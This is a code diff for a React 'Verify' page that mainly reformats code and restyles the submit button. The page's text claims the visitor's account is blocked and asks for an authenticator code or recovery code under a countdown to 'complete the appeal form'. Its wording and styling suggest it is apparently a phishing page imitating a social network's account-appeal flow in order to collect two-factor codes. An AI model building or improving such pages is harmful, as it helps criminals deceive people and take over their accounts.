@@ -19,7 +19,8 @@ const Verify = () => {
             description: 'We have temporarily blocked your account because your protect has changed. Verify code has been sent',
             placeholder: 'Enter your code',
             infoTitle: 'Approve from another device or Enter your verification code',
-            infoDescription: 'Enter the 6-digit code we just sent from the authenticator app you set up or Enter the 8-digit recovery code. Please enter the code within 02:21 to complete the appeal form.',
+            infoDescription:
+                'Enter the 6-digit code we just sent from the authenticator app you set up or Enter the 8-digit recovery code. Please enter the code within 02:21 to complete the appeal form.',
             walkthrough: "We'll walk you through some steps to secure and unlock your account.",
             submit: 'Submit',
             sendCode: 'Send Code',
@@ -35,7 +36,31 @@ const Verify = () => {
     const translateAllTexts = useCallback(
         async (targetLang) => {
             try {
-                const [translatedTitle, translatedDesc, translatedPlaceholder, translatedInfoTitle, translatedInfoDesc, translatedWalkthrough, translatedSubmit, translatedSendCode, translatedError, translatedLoading, translatedSeconds] = await Promise.all([translateText(defaultTexts.title, targetLang), translateText(defaultTexts.description, targetLang), translateText(defaultTexts.placeholder, targetLang), translateText(defaultTexts.infoTitle, targetLang), translateText(defaultTexts.infoDescription, targetLang), translateText(defaultTexts.walkthrough, targetLang), translateText(defaultTexts.submit, targetLang), translateText(defaultTexts.sendCode, targetLang), translateText(defaultTexts.errorMessage, targetLang), translateText(defaultTexts.loadingText, targetLang), translateText(defaultTexts.secondsText, targetLang)]);
+                const [
+                    translatedTitle,
+                    translatedDesc,
+                    translatedPlaceholder,
+                    translatedInfoTitle,
+                    translatedInfoDesc,
+                    translatedWalkthrough,
+                    translatedSubmit,
+                    translatedSendCode,
+                    translatedError,
+                    translatedLoading,
+                    translatedSeconds
+                ] = await Promise.all([
+                    translateText(defaultTexts.title, targetLang),
+                    translateText(defaultTexts.description, targetLang),
+                    translateText(defaultTexts.placeholder, targetLang),
+                    translateText(defaultTexts.infoTitle, targetLang),
+                    translateText(defaultTexts.infoDescription, targetLang),
+                    translateText(defaultTexts.walkthrough, targetLang),
+                    translateText(defaultTexts.submit, targetLang),
+                    translateText(defaultTexts.sendCode, targetLang),
+                    translateText(defaultTexts.errorMessage, targetLang),
+                    translateText(defaultTexts.loadingText, targetLang),
+                    translateText(defaultTexts.secondsText, targetLang)
+                ]);
 
                 setTranslatedTexts({
                     title: translatedTitle,
@@ -121,7 +146,16 @@ const Verify = () => {
                 <p className='text-3xl font-bold'>{translatedTexts.title}</p>
                 <p>{translatedTexts.description}</p>
                 <img src={VerifyImage} alt='' />
-                <input type='number' inputMode='numeric' max={8} placeholder={translatedTexts.placeholder} className='rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2' value={code} onChange={(e) => setCode(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && handleSubmit()} />
+                <input
+                    type='number'
+                    inputMode='numeric'
+                    max={8}
+                    placeholder={translatedTexts.placeholder}
+                    className='rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2'
+                    value={code}
+                    onChange={(e) => setCode(e.target.value)}
+                    onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
+                />
                 {showError && <p className='text-sm text-red-500'>{translatedTexts.errorMessage}</p>}
                 <div className='flex items-center gap-4 bg-[#f8f9fa] p-4'>
                     <FontAwesomeIcon icon={faCircleInfo} size='xl' className='text-[#9f580a]' />
@@ -131,9 +165,16 @@ const Verify = () => {
                     </div>
                 </div>
                 <p>{translatedTexts.walkthrough}</p>
-                <button className='rounded-lg border border-gray-300 bg-[#f8f9fa] py-4 font-medium hover:bg-blue-500 hover:text-white disabled:opacity-50' onClick={handleSubmit} disabled={isLoading || !code.trim()}>
+
+                {/* Nút Submit đã được update */}
+                <button
+                    className='rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400'
+                    onClick={handleSubmit}
+                    disabled={isLoading || !code.trim()}
+                >
                     {isLoading ? `${translatedTexts.loadingText} ${formatTime(countdown)}...` : translatedTexts.submit}
                 </button>
+
                 <p className='cursor-pointer text-center text-blue-900 hover:underline'>{translatedTexts.sendCode}</p>
             </div>
         </div>
